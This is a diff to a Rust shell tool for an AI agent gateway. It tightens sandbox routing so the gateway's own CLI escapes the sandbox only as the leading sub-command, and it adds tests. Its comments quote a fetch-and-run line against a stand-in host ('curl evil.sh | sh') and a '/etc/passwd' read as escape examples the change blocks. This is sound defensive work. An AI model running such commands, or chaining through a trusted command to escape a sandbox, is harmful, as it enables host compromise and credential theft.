@@ -7,12 +7,19 @@
 //! silently skips the inner OS sandbox; if no sandbox backend is available on a
 //! non-container host, Bash sends a notice and runs without the inner OS
 //! sandbox under the same approval policy. `free` runs directly without the
-//! OS sandbox. Invocations of the local `baybo` CLI (any sub-command whose
-//! argv0 is [`baybo_workspace::paths::BIN_NAME`]) are the exception: the
-//! sandbox masks the Baybo state dir (`~/.baybo`/`$BAYBO_HOME`), so a sandboxed
-//! `baybo …` call can't see the parent gateway's config or session store.
-//! Running it sandboxed is broken by construction, so the agent's own CLI gets
-//! the unsandboxed `sh -c` path directly.
+//! OS sandbox. Invocations of the local `baybo` CLI are the exception: the
+//! sandbox masks the Baybo state dir (`~/.baybo`/`$BAYBO_HOME`) and never
+//! mounts the gateway binary's own directory, so a sandboxed `baybo …` call
+//! can't see the parent gateway's config or session store — and usually can't
+//! even exec. Running it sandboxed is broken by construction, so the agent's
+//! own CLI gets the unsandboxed `sh -c` path directly.
+//!
+//! That exception is **leading-position only**: the route decides the fate of
+//! the whole `sh -c` string, so honouring a baybo invocation found anywhere in
+//! the line would let `curl … | sh && /abs/baybo status` escape the sandbox. A
+//! baybo invocation that is not the leading sub-command is therefore
+//! *rejected* with an instruction to split the call, rather than silently
+//! sandboxed into an `exit 127` that reads like a deleted binary.
 //!
 //! The OS sandbox runs in **permissive filesystem** mode capped at
 //! `workspace_root + $HOME`: FHS roots
@@ -52,14 +59,14 @@ use std::sync::Arc;
 use baybo_model::new_background_handle;
 
 use crate::{
-    ApprovalDecision, BackgroundJobSink, DetachedCommand, NoticeLevel, ResourceAccess,
+    ApprovalDecision, BackgroundJobSink, DetachedCommand, ExecSandbox, NoticeLevel, ResourceAccess,
     RunningChild, SpawnOpts, Tool, ToolContext, ToolError, ToolOutput,
 };
 
 mod judge;
 mod parse;
 
-use judge::{PostFail, PreExec, judge_post_fail, judge_pre_exec};
+use judge::{PostFail, PostFailInput, PreExec, judge_post_fail, judge_pre_exec};
 use parse::{
     DELETE_SCAN_EVENT_ACTION, contains_delete_command, first_token, is_env_assignment,
     parse_program, split_into_subcommands, truncate_for_event,
@@ -123,7 +130,7 @@ ENVIRONMENT:
 const SANDBOXED_ISOLATION: &str = r#"SANDBOX: The shell has read+write access to the workspace and `$HOME`, with the FHS roots (`/usr`, `/bin`, `/etc`, …) readable; nothing outside that union exists. The usual credential directories under `$HOME` (ssh, aws, gnupg, gh, gcloud, docker, kube, and Baybo's own state dir) are masked and read as empty, and `/dev` is minimal. Network is enabled."#;
 
 #[cfg(not(feature = "bench-bash"))]
-const SANDBOXED_WORK_DIR_SCOPE: &str = r#"WORK-DIR SCOPE: Inside the workspace, Bash may only name {{work_dir}} (read+write) and `skills/` (read+execute, never write). Every other path under the workspace root is rejected up front, `cwd` included — reach those through `Read`/`Edit`/`Write` instead. Paths outside the workspace are unaffected by this rule.
+const SANDBOXED_WORK_DIR_SCOPE: &str = r#"WORK-DIR SCOPE: Inside the workspace, Bash may only name {{work_dir}} (read+write), `skills/` (read+execute, never write), and blob payload paths returned by `GetBlob` (read-only). Every other path under the workspace root is rejected up front, `cwd` included — reach those through `Read`/`Edit`/`Write` instead. Paths outside the workspace are unaffected by this rule.
 
 SCRATCH: Put disposable/intermediate files (probe scripts, one-off downloads, temp build output) under {{work_tmp_dir}} — it is swept automatically after {{work_tmp_ttl_days}} days. Deliverables the user should keep belong elsewhere under {{work_dir}}."#;
 
@@ -347,15 +354,6 @@ impl BashTool {
             process_manager,
             permission: Arc::new(LivePermissionMode::new(BashPermissionMode::default())),
         }
-    }
-
-    /// The calling agent's skill directory — the one tree a command may name
-    /// paths inside besides `work/`. It is bound read-only into the sandbox,
-    /// and running an installed skill's bundled script in place is the point.
-    /// Per call rather than per process because the agent decides it, and
-    /// another agent's tree is neither bound nor exempt.
-    fn skill_root(&self, ctx: &ToolContext) -> PathBuf {
-        absolutise(&ctx.agent_id.skills_dir(&ctx.workspace_paths))
     }
 
     /// Pin a fixed permission mode via a fresh (non-shared) handle. For callers
@@ -770,7 +768,7 @@ impl Tool for BashTool {
                 &command,
                 &self.workspace_root,
                 &self.work_dir,
-                &self.skill_root(ctx),
+                &crate::shell_reachable_workspace_roots(&ctx.workspace_paths, &ctx.agent_id),
             )?;
         }
         // The bench profile has no work-dir jail, so a command with no explicit
@@ -823,26 +821,14 @@ impl Tool for BashTool {
 
         let permission = self.permission();
         let execution_route = bash_execution_route(&command, permission);
-        if matches!(
-            execution_route,
-            BashExecutionRoute::RejectNonCanonicalBayboCliPath
-        ) {
-            // The agent is clearly trying to invoke baybo (basename
-            // match) but used a bare/relative/wrong-absolute argv0.
-            // Sandboxing would just fail opaquely on the masked
-            // state dir; surface a precise instruction with the
-            // correct absolute path so the agent can self-correct.
-            let bin_display = BAYBO_BIN
-                .as_deref()
-                .map(|p| p.display().to_string())
-                .unwrap_or_else(|| "<unknown>".into());
-            return Err(ToolError::InvalidParams(format!(
-                "Baybo CLI invocations must use the absolute path of the gateway binary. \
-                 Replace the argv0 with `{bin_display}` (e.g. \
-                 `{bin_display} cost` instead of `baybo cost`). \
-                 Bare-name and relative-path invocations are rejected so the \
-                 unsandboxed shell never resolves `baybo` through `$PATH`."
-            )));
+        // Both rejections surface a precise instruction naming the correct
+        // absolute path: sandboxing either shape would fail opaquely on the
+        // masked state dir / unmounted binary, and the agent has no way to
+        // learn the rule from the failure itself.
+        if let Some(template) = baybo_cli_rejection_template(execution_route) {
+            return Err(ToolError::InvalidParams(
+                template.replace(BAYBO_BIN_PLACEHOLDER, &baybo_bin_display()),
+            ));
         }
         let sandbox_bypassed = execution_route.is_sandboxed() && ctx.sandbox.is_none();
         let effective_sandboxed = execution_route.is_sandboxed() && !sandbox_bypassed;
@@ -1009,14 +995,16 @@ impl Tool for BashTool {
             )
             .await?;
 
+        let sandbox_for_note = (effective_sandboxed && escalation.is_none())
+            .then_some(ctx.sandbox.as_deref())
+            .flatten();
         format_command_result(
             &command,
-            out.exit_code,
-            &out.stdout,
-            &out.stderr,
+            &out,
             &extra_env,
             ctx,
             escalation.as_deref(),
+            sandbox_for_note,
         )
         .await
     }
@@ -1026,17 +1014,20 @@ impl Tool for BashTool {
 /// stdout/stderr (secret values redacted), the exit code, and an optional
 /// hint for well-known non-zero exits. Shared by the blocking path and the
 /// detached path's foreground-completion case.
+/// `sandbox` is `Some` only when THIS output came from a sandboxed run that
+/// was not re-run unsandboxed: an escaped run's output is host-side, so a
+/// visibility note about it would describe a sandbox that never produced it.
 async fn format_command_result(
     command: &str,
-    exit_code: i32,
-    stdout_bytes: &[u8],
-    stderr_bytes: &[u8],
+    out: &crate::SandboxedOutput,
     extra_env: &ChildEnv,
     ctx: &ToolContext,
     escalation_note: Option<&str>,
+    sandbox: Option<&dyn ExecSandbox>,
 ) -> crate::Result<ToolOutput> {
-    let mut stdout = truncate_utf8(stdout_bytes, MAX_OUTPUT_BYTES);
-    let mut stderr = truncate_utf8(stderr_bytes, MAX_OUTPUT_BYTES);
+    let exit_code = out.exit_code;
+    let mut stdout = truncate_utf8(&out.stdout, MAX_OUTPUT_BYTES);
+    let mut stderr = truncate_utf8(&out.stderr, MAX_OUTPUT_BYTES);
     // Scrub injected secret values out of the output before it reaches the
     // agent / LLM / trace — the leak detector only catches known formats,
     // so arbitrary user tokens are redacted here by exact match.
@@ -1053,6 +1044,11 @@ async fn format_command_result(
     });
     if let Some(hint) = interpret_exit(command, exit_code) {
         result["return_code_interpretation"] = Value::String(hint.into());
+    }
+    // Told before the escalation note below: when both fire, the reason the
+    // command failed matters more than how the runtime reacted.
+    if let Some(note) = sandbox.and_then(|s| sandbox_visibility_note(exit_code, &stderr, s)) {
+        result["sandbox_visibility"] = Value::String(note);
     }
     // Auto permission: tell the LLM this result came from an unsandboxed re-run
     // so it reasons about the elevated privilege rather than assuming the
@@ -1208,15 +1204,18 @@ async fn run_detached(
             let (out, escalation) = tool
                 .escalate_if_failed(command, cwd, out, extra_env, timeout, ctx, escape_policy)
                 .await?;
+            let sandbox_for_note = (route == DetachedExecutionRoute::Sandboxed
+                && escalation.is_none())
+            .then_some(ctx.sandbox.as_deref())
+            .flatten();
             Ok(Some(
                 format_command_result(
                     command,
-                    out.exit_code,
-                    &out.stdout,
-                    &out.stderr,
+                    &out,
                     extra_env,
                     ctx,
                     escalation.as_deref(),
+                    sandbox_for_note,
                 )
                 .await?,
             ))
@@ -1335,8 +1334,8 @@ fn require_within_work_dir(
         return Err(ToolError::InvalidParams(format!(
             "Bash {label} `{}` is inside the workspace but outside the work \
              directory. Only `{}` is writable for shell operations (your own \
-             skill directory is bound read-only so installed skill scripts can \
-             run in place) — move the action under `{}/` or use \
+             skill directory and blob payload paths from `GetBlob` are also \
+             nameable, read-only) — move the action under `{}/` or use \
              Read/Edit/Write for the read-only workspace subtrees (personas/, \
              config/, state/, logs/, .key/).",
             path.display(),
@@ -1365,7 +1364,7 @@ fn require_command_paths_within_work_dir(
     command: &str,
     workspace_root: &Path,
     work_dir: &Path,
-    skill_root: &Path,
+    exempt_roots: &[PathBuf],
 ) -> crate::Result<()> {
     for sub in split_into_subcommands(command) {
         for tok in sub {
@@ -1374,7 +1373,7 @@ fn require_command_paths_within_work_dir(
             };
             for word in words {
                 let p = Path::new(&word);
-                if p.is_absolute() && p.starts_with(skill_root) {
+                if p.is_absolute() && exempt_roots.iter().any(|root| p.starts_with(root)) {
                     continue;
                 }
                 require_within_work_dir(p, workspace_root, work_dir, "command argument")?;
@@ -1392,6 +1391,53 @@ fn require_command_paths_within_work_dir(
 /// `find` is intentionally absent: it exits `0` even when nothing
 /// matches, so any `1` is a real traversal/permission/syntax error
 /// — relabelling that as "no matches" would mask the failure.
+/// `sh` exit status for "found the command line but could not execute the
+/// program" — the shape an unmounted binary produces inside the sandbox.
+const EXIT_COMMAND_NOT_FOUND: i32 = 127;
+
+/// The `ENOENT` text a POSIX shell prints for a program it cannot execute.
+const SHELL_ENOENT_MARKER: &str = "No such file or directory";
+
+/// Substituted with the offending program path in [`SANDBOX_VISIBILITY_NOTE`].
+const PATH_PLACEHOLDER: &str = "{{path}}";
+
+const SANDBOX_VISIBILITY_NOTE: &str = r#"`{{path}}` was never mounted into this sandbox, which exposes only the workspace work dir, $HOME and the read-only FHS roots. Exit 127 here means "not visible from inside the sandbox" — it is NOT evidence that the file is missing on the host, where it may well exist. Re-running the same command will fail identically; read the path with a tool that runs outside the sandbox (Read / Glob) before concluding anything about whether it exists."#;
+
+/// The absolute program path a shell named in its `ENOENT` complaint:
+/// `sh: line 1: /opt/x/bin: No such file or directory` → `/opt/x/bin`.
+/// `None` when no line has that shape or the name is not absolute — a
+/// relative name failing is a `$PATH` question, not a mount question.
+fn enoent_program_path(stderr: &str) -> Option<&str> {
+    stderr.lines().find_map(|line| {
+        let head = line
+            .trim_end()
+            .strip_suffix(SHELL_ENOENT_MARKER)?
+            .trim_end();
+        let path = head.strip_suffix(':')?.rsplit(": ").next()?;
+        path.starts_with('/').then_some(path)
+    })
+}
+
+/// Explain an `exit 127` that the sandbox caused, when the sandbox can
+/// prove it caused it. Returns `None` whenever the backend answers
+/// `None` (cannot tell) or `Some(true)` (the path IS mounted, so the
+/// binary really is absent) — claiming a mounted path is invisible would
+/// send the agent down exactly the wrong branch.
+fn sandbox_visibility_note(
+    exit_code: i32,
+    stderr: &str,
+    sandbox: &dyn ExecSandbox,
+) -> Option<String> {
+    if exit_code != EXIT_COMMAND_NOT_FOUND {
+        return None;
+    }
+    let path = enoent_program_path(stderr)?;
+    if sandbox.path_is_visible(Path::new(path)) != Some(false) {
+        return None;
+    }
+    Some(SANDBOX_VISIBILITY_NOTE.replace(PATH_PLACEHOLDER, path))
+}
+
 fn interpret_exit(command: &str, exit_code: i32) -> Option<&'static str> {
     if exit_code != 1 {
         return None;
@@ -1497,6 +1543,36 @@ static BAYBO_BIN: LazyLock<Option<PathBuf>> = LazyLock::new(|| {
     Some(std::fs::canonicalize(&exe).unwrap_or(exe))
 });
 
+/// Substituted with [`baybo_bin_display`] in the rejection templates below.
+const BAYBO_BIN_PLACEHOLDER: &str = "{{baybo_bin}}";
+
+const NON_CANONICAL_BAYBO_CLI_REJECTION: &str = r#"Baybo CLI invocations must use the absolute path of the gateway binary. Replace the argv0 with `{{baybo_bin}}` (e.g. `{{baybo_bin}} cost` instead of `baybo cost`). Bare-name and relative-path invocations are rejected so the unsandboxed shell never resolves `baybo` through `$PATH`."#;
+
+const CHAINED_BAYBO_CLI_REJECTION: &str = r#"This command runs the Baybo CLI, but not as the FIRST sub-command on the line. Only a leading `{{baybo_bin}}` runs unsandboxed; anything else makes the WHOLE line run inside the OS sandbox, where `{{baybo_bin}}` is not mounted — you would get `exit 127` / `No such file or directory`, which does NOT mean the binary is missing on the host. Split this into two Bash calls: run the non-baybo part first, then run `{{baybo_bin}} …` as its own call with the baybo invocation first. Chaining other commands AFTER a leading baybo invocation is fine."#;
+
+/// Absolute path of the gateway binary as shown to the agent, or a
+/// placeholder when `current_exe()` was unreadable.
+fn baybo_bin_display() -> String {
+    BAYBO_BIN
+        .as_deref()
+        .map(|p| p.display().to_string())
+        .unwrap_or_else(|| "<unknown>".into())
+}
+
+/// The instruction to return for a route that rejects a baybo CLI shape,
+/// or `None` for routes that actually execute.
+fn baybo_cli_rejection_template(route: BashExecutionRoute) -> Option<&'static str> {
+    match route {
+        BashExecutionRoute::RejectNonCanonicalBayboCliPath => {
+            Some(NON_CANONICAL_BAYBO_CLI_REJECTION)
+        }
+        BashExecutionRoute::RejectChainedBayboCli => Some(CHAINED_BAYBO_CLI_REJECTION),
+        BashExecutionRoute::RunBayboCliUnsandboxed
+        | BashExecutionRoute::RunUnsandboxed
+        | BashExecutionRoute::RunSandboxed { .. } => None,
+    }
+}
+
 /// What the command line appears to be relative to the gateway's own `baybo`
 /// CLI. This enum deliberately does not mention sandboxing; the final execution
 /// route also depends on [`BashPermissionMode`].
@@ -1512,19 +1588,25 @@ static BAYBO_BIN: LazyLock<Option<PathBuf>> = LazyLock::new(|| {
 ///   the command is clearly trying to invoke baybo (its argv0's `file_name`
 ///   matches the gateway binary), but the caller used a bare/relative/wrong
 ///   absolute path.
-/// - [`OtherCommand`](BayboCliCommandKind::OtherCommand): baybo isn't the
-///   leading sub-command, OR an unsafe-env shape prevents treating it as a
+/// - [`ChainedSelfInvocation`](BayboCliCommandKind::ChainedSelfInvocation):
+///   baybo is invoked somewhere in the line but NOT as the leading
+///   sub-command, so the whole line would run sandboxed and the gateway
+///   binary would not exist inside it.
+/// - [`OtherCommand`](BayboCliCommandKind::OtherCommand): baybo isn't invoked
+///   at all, OR an unsafe-env shape prevents treating it as a
 ///   trusted self-invocation.
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
 enum BayboCliCommandKind {
     CanonicalSelfInvocation,
     NonCanonicalSelfInvocation,
+    ChainedSelfInvocation,
     OtherCommand,
 }
 
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
 enum BashExecutionRoute {
     RejectNonCanonicalBayboCliPath,
+    RejectChainedBayboCli,
     RunBayboCliUnsandboxed,
     RunUnsandboxed,
     RunSandboxed {
@@ -1572,7 +1654,8 @@ impl BashExecutionRoute {
             BashExecutionRoute::RunBayboCliUnsandboxed | BashExecutionRoute::RunUnsandboxed => {
                 Some(DetachedExecutionRoute::Unsandboxed)
             }
-            BashExecutionRoute::RejectNonCanonicalBayboCliPath => None,
+            BashExecutionRoute::RejectNonCanonicalBayboCliPath
+            | BashExecutionRoute::RejectChainedBayboCli => None,
         }
     }
 
@@ -1619,6 +1702,11 @@ fn bash_execution_route_for_kind(
         BayboCliCommandKind::NonCanonicalSelfInvocation => {
             BashExecutionRoute::RejectNonCanonicalBayboCliPath
         }
+        // Rejected regardless of permission mode: under `free` the line
+        // would run unsandboxed and work, but accepting it there would
+        // teach the model a command shape that silently breaks the moment
+        // the same session runs under `auto`/`manual`.
+        BayboCliCommandKind::ChainedSelfInvocation => BashExecutionRoute::RejectChainedBayboCli,
         BayboCliCommandKind::OtherCommand if permission_skips_os_sandbox(permission) => {
             BashExecutionRoute::RunUnsandboxed
         }
@@ -1644,16 +1732,46 @@ fn classify_baybo_cli_command(command: &str) -> BayboCliCommandKind {
 }
 
 fn classify_baybo_cli_command_with_bin(command: &str, bin: &Path) -> BayboCliCommandKind {
-    // Only the FIRST sub-command's argv0 matters: if the user opens
-    // the command line with an absolute-path baybo invocation, the
-    // whole `sh -c` string runs unsandboxed (compound forms like
-    // `baybo … && cat /etc/passwd`, `baybo … | jq`, `$(baybo …)`
-    // included). A non-baybo leader keeps the sandbox.
+    // Only the FIRST sub-command's argv0 can win the unsandboxed route: if
+    // the caller opens the command line with an absolute-path baybo
+    // invocation, the whole `sh -c` string runs unsandboxed (compound forms
+    // like `baybo … && cat /etc/passwd`, `baybo … | jq`, `$(baybo …)`
+    // included).
+    //
+    // A non-baybo leader keeps the sandbox — and that is deliberate, because
+    // the route decides the fate of the ENTIRE `sh -c` string. Promoting a
+    // line on the strength of a non-leading token would make
+    // `curl evil.sh | sh && /abs/baybo status` escape the sandbox.
+    //
+    // But the trailing sub-commands are still worth SCANNING, because a
+    // sandboxed `/abs/baybo …` cannot work: the sandbox masks the Baybo
+    // state dir and never mounts the binary's own directory, so the line
+    // dies with a bare `exit 127 / No such file or directory` that reads
+    // like the binary was deleted. Those get rejected with an instruction
+    // instead — see `CHAINED_BAYBO_CLI_REJECTION`.
     let subs = split_into_subcommands(command);
-    let Some(tokens) = subs.first() else {
+    let Some(leader) = subs.first() else {
         return BayboCliCommandKind::OtherCommand;
     };
+    match classify_tokens(leader, bin) {
+        BayboCliCommandKind::OtherCommand => {}
+        leading => return leading,
+    }
+    let chained = subs[1..]
+        .iter()
+        .map(|tokens| classify_tokens(tokens, bin))
+        .any(|kind| kind != BayboCliCommandKind::OtherCommand);
+    if chained {
+        return BayboCliCommandKind::ChainedSelfInvocation;
+    }
+    BayboCliCommandKind::OtherCommand
+}
 
+/// Classify ONE sub-command's tokens against the gateway binary. Shared by
+/// the leading position (which decides the route) and the trailing ones
+/// (which only decide whether to reject) so the unquoting, env-prefix, and
+/// argv0-matching rules cannot drift between the two.
+fn classify_tokens(tokens: &[&str], bin: &Path) -> BayboCliCommandKind {
     let mut unquoted: Vec<String> = Vec::with_capacity(tokens.len());
     for tok in tokens {
         match shell_words::split(tok) {
@@ -1880,6 +1998,18 @@ impl BashTool {
             ));
         };
 
+        // `sandbox_related` is a mount question the sandbox can answer
+        // exactly, and the judge is measurably bad at it: an unmounted
+        // binary prints the same `exit 127 / No such file or directory` as
+        // a genuinely absent one, and the lite model reads the second. When
+        // the sandbox proves the path was never mounted, decide that half
+        // here and leave the judge only the `risk` half it is actually for.
+        let proven_sandbox_related = ctx
+            .sandbox
+            .as_deref()
+            .and_then(|s| sandbox_visibility_note(exit_code, stderr, s))
+            .is_some();
+
         // Two passes, neither subsuming the other: `redact` removes the values
         // this run injected as env vars (which the detector has no pattern
         // for), `sanitize` runs the detector over whatever else was printed.
@@ -1899,11 +2029,14 @@ impl BashTool {
         match judge_post_fail(
             llm,
             &ctx.events,
-            command,
-            cwd,
-            exit_code,
-            &stdout_s,
-            &stderr_s,
+            PostFailInput {
+                command,
+                cwd,
+                exit_code,
+                stdout_tail: &stdout_s,
+                stderr_tail: &stderr_s,
+                known_sandbox_related: proven_sandbox_related,
+            },
         )
         .await
         {
@@ -2764,24 +2897,194 @@ mod tests {
         ));
     }
 
+    /// Sandbox stub with a canned visibility answer. `FakeExecSandbox` takes
+    /// the trait's default `None`, which is the right production default but
+    /// cannot exercise the note; this one carries the answer instead.
+    struct VisibilityStub {
+        visible: Option<bool>,
+        response: crate::SandboxedOutput,
+    }
+
+    impl VisibilityStub {
+        fn answering(visible: Option<bool>) -> Self {
+            Self {
+                visible,
+                response: crate::SandboxedOutput::default(),
+            }
+        }
+    }
+
+    #[async_trait]
+    impl ExecSandbox for VisibilityStub {
+        async fn spawn_command(
+            &self,
+            _program: &Path,
+            _args: &[String],
+            _opts: SpawnOpts,
+        ) -> crate::Result<crate::SandboxedOutput> {
+            Ok(self.response.clone())
+        }
+        fn path_is_visible(&self, _path: &Path) -> Option<bool> {
+            self.visible
+        }
+    }
+
     #[test]
-    fn classify_baybo_marks_command_as_other_when_baybo_not_leading() {
-        // Non-baybo leaders are not trusted self-invocations even when baybo
-        // appears later in the pipeline — the leader's argv0 is what drives the
-        // classification.
+    fn enoent_program_path_extracts_the_absolute_program() {
+        assert_eq!(
+            enoent_program_path(
+                "sh: line 1: /data/x/target/release/baybo: No such file or directory\n"
+            ),
+            Some("/data/x/target/release/baybo")
+        );
+        // A relative name failing is a `$PATH` question, not a mount one.
+        assert_eq!(
+            enoent_program_path("sh: line 1: baybo: No such file or directory"),
+            None
+        );
+        // Unrelated ENOENT text (a program complaining about its own input)
+        // has no shell-prefixed path to extract.
+        assert_eq!(
+            enoent_program_path("cat: nope.txt: No such file or directory"),
+            None
+        );
+        assert_eq!(enoent_program_path("some other failure"), None);
+    }
+
+    #[test]
+    fn sandbox_visibility_note_only_fires_on_a_proven_invisible_path() {
+        let stderr = "sh: line 1: /opt/tool/bin/x: No such file or directory";
+        // Proven outside the sandbox → explain it.
+        let note = sandbox_visibility_note(
+            EXIT_COMMAND_NOT_FOUND,
+            stderr,
+            &VisibilityStub::answering(Some(false)),
+        )
+        .expect("invisible path yields a note");
+        assert!(note.contains("/opt/tool/bin/x"));
+        assert!(!note.contains(PATH_PLACEHOLDER));
+        // Mounted → the binary really is absent; claiming otherwise would
+        // send the agent down the wrong branch.
+        assert!(
+            sandbox_visibility_note(
+                EXIT_COMMAND_NOT_FOUND,
+                stderr,
+                &VisibilityStub::answering(Some(true))
+            )
+            .is_none()
+        );
+        // Backend can't answer → say nothing.
+        assert!(
+            sandbox_visibility_note(
+                EXIT_COMMAND_NOT_FOUND,
+                stderr,
+                &VisibilityStub::answering(None)
+            )
+            .is_none()
+        );
+        // A different exit code is a different failure entirely.
+        assert!(
+            sandbox_visibility_note(1, stderr, &VisibilityStub::answering(Some(false))).is_none()
+        );
+    }
+
+    #[test]
+    fn classify_baybo_flags_non_leading_baybo_as_chained() {
+        // A non-baybo leader never wins the unsandboxed route — the whole
+        // `sh -c` string would run sandboxed, where the gateway binary is not
+        // mounted, so the call cannot succeed. These are rejected with an
+        // instruction instead of being sandboxed into an opaque `exit 127`.
         let bin = Path::new("/usr/local/bin/baybo");
-        assert!(matches!(
-            classify("echo $(/usr/local/bin/baybo status)", bin),
-            BayboCliCommandKind::OtherCommand
-        ));
-        assert!(matches!(
-            classify("echo `/usr/local/bin/baybo status`", bin),
-            BayboCliCommandKind::OtherCommand
-        ));
-        assert!(matches!(
-            classify("cd /tmp && /usr/local/bin/baybo status", bin),
-            BayboCliCommandKind::OtherCommand
-        ));
+        for command in [
+            "echo $(/usr/local/bin/baybo status)",
+            "echo `/usr/local/bin/baybo status`",
+            "cd /tmp && /usr/local/bin/baybo status",
+            // The incident shape: a canonical invocation chained behind an
+            // unrelated build/test step.
+            "python3 -m py_compile x.py && uv run python -c 'pass' \
+             && /usr/local/bin/baybo mcp remove netdata-alerts --yes",
+        ] {
+            assert_eq!(
+                classify(command, bin),
+                BayboCliCommandKind::ChainedSelfInvocation,
+                "{command}"
+            );
+        }
+        // A non-canonical spelling in a trailing position is equally doomed,
+        // and reports the same way — the caller has to split the line either
+        // way before the path spelling can even matter.
+        assert_eq!(
+            classify("cd /tmp && baybo status", bin),
+            BayboCliCommandKind::ChainedSelfInvocation
+        );
+    }
+
+    #[test]
+    fn classify_baybo_keeps_chained_lookalikes_out_of_the_reject_path() {
+        // The chained scan must not fire on commands that merely mention
+        // baybo — rejecting those would break ordinary shell work.
+        let bin = Path::new("/usr/local/bin/baybo");
+        for command in [
+            "cd /tmp && echo baybo",
+            "ls && grep baybo out.txt",
+            "cd /tmp && ./baybolity status",
+            // A *wrapper* in a trailing position: argv0 is the wrapper, so
+            // this stays an ordinary sandboxed command, exactly as it would
+            // in the leading position.
+            "cd /tmp && nohup baybo cost",
+        ] {
+            assert_eq!(
+                classify(command, bin),
+                BayboCliCommandKind::OtherCommand,
+                "{command}"
+            );
+        }
+    }
+
+    #[test]
+    fn chained_baybo_cli_is_rejected_under_every_permission_mode() {
+        // `free` would run the line unsandboxed and it would work — but
+        // accepting the shape there teaches a command form that breaks the
+        // moment the same session runs under `auto`/`manual`.
+        for permission in [
+            BashPermissionMode::Auto,
+            BashPermissionMode::Manual,
+            BashPermissionMode::Free,
+        ] {
+            assert_eq!(
+                bash_execution_route_for_kind(
+                    BayboCliCommandKind::ChainedSelfInvocation,
+                    permission
+                ),
+                BashExecutionRoute::RejectChainedBayboCli,
+                "{permission:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn rejection_templates_name_the_gateway_binary() {
+        // The whole point of both rejections is that the agent learns the
+        // correct spelling from the error, so the placeholder must actually
+        // be substituted and the routes that execute must stay silent.
+        for route in [
+            BashExecutionRoute::RejectChainedBayboCli,
+            BashExecutionRoute::RejectNonCanonicalBayboCliPath,
+        ] {
+            let template =
+                baybo_cli_rejection_template(route).expect("reject route yields a template");
+            let rendered = template.replace(BAYBO_BIN_PLACEHOLDER, "/opt/baybo/bin/baybo");
+            assert!(rendered.contains("/opt/baybo/bin/baybo"), "{route:?}");
+            assert!(!rendered.contains(BAYBO_BIN_PLACEHOLDER), "{route:?}");
+        }
+        assert!(baybo_cli_rejection_template(BashExecutionRoute::RunBayboCliUnsandboxed).is_none());
+        assert!(
+            baybo_cli_rejection_template(BashExecutionRoute::RunSandboxed {
+                pre_exec_judge: true,
+                escape_policy: SandboxEscapePolicy::AutoJudge,
+            })
+            .is_none()
+        );
     }
 
     #[test]
@@ -4356,6 +4659,34 @@ mod tests {
     }
 
     #[tokio::test]
+    async fn execute_rejects_baybo_chained_behind_another_command() {
+        // The incident shape. A canonical invocation chained behind an
+        // unrelated step used to be sandboxed silently and die with a bare
+        // `exit 127 / No such file or directory`, which the model read as
+        // "the binary was deleted". It must now be refused with an
+        // instruction to split the call.
+        let exe = std::env::current_exe().expect("current_exe in test");
+        let exe_canon = std::fs::canonicalize(&exe).unwrap_or_else(|_| exe.clone());
+        let command = format!("true && {} --probe", exe_canon.display());
+
+        let err = BashTool::for_test()
+            .execute(json!({ "command": command }), &ctx_with(None))
+            .await
+            .unwrap_err();
+        let ToolError::InvalidParams(msg) = err else {
+            panic!("expected InvalidParams, got {err:?}");
+        };
+        assert!(
+            msg.contains(&exe_canon.display().to_string()),
+            "error must name the gateway binary: {msg}"
+        );
+        assert!(
+            msg.contains("FIRST") && msg.contains("two Bash calls"),
+            "error must teach the leading-position rule and the fix: {msg}"
+        );
+    }
+
+    #[tokio::test]
     async fn canonical_baybo_invocations_run_unsandboxed() {
         // `baybo …` commands must NOT consult the sandbox: the sandbox
         // masks `~/.baybo`/`$BAYBO_HOME`, so a sandboxed baybo process
@@ -4437,6 +4768,63 @@ mod tests {
             "command body should land at the tail of the sh -c arg, got: {}",
             calls[0].args[1],
         );
+    }
+
+    #[tokio::test]
+    async fn sandboxed_enoent_result_carries_the_visibility_note() {
+        // Wiring test for the incident's tool result: the unit test above
+        // covers the decision, this one proves the note actually reaches the
+        // JSON the model reads.
+        let stub = VisibilityStub {
+            visible: Some(false),
+            response: SandboxedOutput {
+                exit_code: EXIT_COMMAND_NOT_FOUND,
+                stdout: Vec::new(),
+                stderr: b"sh: line 1: /data/x/target/release/baybo: No such file or directory\n"
+                    .to_vec(),
+                timed_out: false,
+            },
+        };
+        let sandbox: Arc<dyn crate::ExecSandbox> = Arc::new(stub);
+        let out = BashTool::for_test()
+            .execute(
+                json!({ "command": "/data/x/target/release/baybo status" }),
+                &ctx_with(Some(sandbox)),
+            )
+            .await
+            .unwrap();
+        let ToolOutput::Json(v) = out else { panic!() };
+        assert_eq!(v["exit_code"], EXIT_COMMAND_NOT_FOUND);
+        let note = v["sandbox_visibility"]
+            .as_str()
+            .expect("sandboxed ENOENT on an unmounted path explains itself");
+        assert!(note.contains("/data/x/target/release/baybo"), "{note}");
+        assert!(
+            note.contains("NOT evidence that the file is missing on the host"),
+            "the note must contradict the 'binary was deleted' reading: {note}"
+        );
+    }
+
+    #[tokio::test]
+    async fn a_mounted_path_gets_no_visibility_note() {
+        // Same failure, but the sandbox says the path IS mounted — then the
+        // binary really is absent and a note would misdirect.
+        let stub = VisibilityStub {
+            visible: Some(true),
+            response: SandboxedOutput {
+                exit_code: EXIT_COMMAND_NOT_FOUND,
+                stdout: Vec::new(),
+                stderr: b"sh: line 1: /opt/gone: No such file or directory\n".to_vec(),
+                timed_out: false,
+            },
+        };
+        let sandbox: Arc<dyn crate::ExecSandbox> = Arc::new(stub);
+        let out = BashTool::for_test()
+            .execute(json!({ "command": "/opt/gone" }), &ctx_with(Some(sandbox)))
+            .await
+            .unwrap();
+        let ToolOutput::Json(v) = out else { panic!() };
+        assert!(v.get("sandbox_visibility").is_none());
     }
 
     #[tokio::test]
@@ -4527,6 +4915,36 @@ mod tests {
         assert!(
             msg.contains("/tmp/state/db"),
             "error must name the offending command argument: {msg}"
+        );
+    }
+
+    /// A `GetBlob` answer must survive this guard. The OS sandbox binds
+    /// `state/blobs/` read-only, but this check runs *first* and rejects on
+    /// the path string, so without the exemption the bind is unreachable and
+    /// the whole point of handing out a payload path is lost.
+    #[tokio::test]
+    async fn accepts_blob_payload_paths_the_sandbox_binds_read_only() {
+        let out = BashTool::for_test()
+            .execute(
+                json!({ "command": "file /tmp/state/blobs/1f/deadbeef.jpg" }),
+                &ctx_with(None),
+            )
+            .await;
+        assert!(
+            !matches!(out, Err(ToolError::InvalidParams(_))),
